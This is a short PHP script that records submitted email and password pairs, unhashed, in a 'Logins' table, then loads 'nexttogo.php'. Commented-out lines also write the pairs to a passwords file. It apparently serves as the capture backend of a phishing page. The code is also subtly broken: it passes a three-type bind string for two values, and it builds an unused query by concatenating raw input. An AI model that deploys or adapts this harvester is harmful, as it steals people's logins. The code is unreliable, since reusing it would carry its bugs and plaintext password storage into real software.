<?php
    include 'credentials.php';

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        /*
        $dbservername = "localhost";
        $dbusername = "root";
        $dbpassword = "root";
        $dbname = "Login";
        */
        // Create connection
        $conn = new mysqli(
            $dbservername,
            $dbusername,
            $dbpassword,
            $dbname
        );

        // Check connection
        if ($conn->connect_error) {
          die("Connection failed: " . $conn->connect_error);
        }

        $email = test_input($_POST["email"]);
        $password = test_input($_POST["password"]);

        $sql = "INSERT INTO Logins (email, password) VALUES ('".$email."', '".$password."')";

        $stmt = $conn->prepare("INSERT INTO Logins (email, password) VALUES (?, ?)");
        $stmt->bind_param("sss", $email, $password);

        //$passwordsfile = fopen("/passwordsfile.txt", "a") or die("Unable to open file!");

        //$txt = $email.": ".$password;
        //fwrite($passwordsfile, $txt);
        //fclose($passwordsfile);

        $stmt->execute();
        $stmt->close();
        $conn->close();

        include 'nexttogo.php';

        /*
        if ($conn->query($sql) === TRUE) {
          echo "New record created successfully";
        } else {
          echo "Error: " . $sql . "<br>" . $conn->error;
        }

        $conn->close();
        */
    }
?>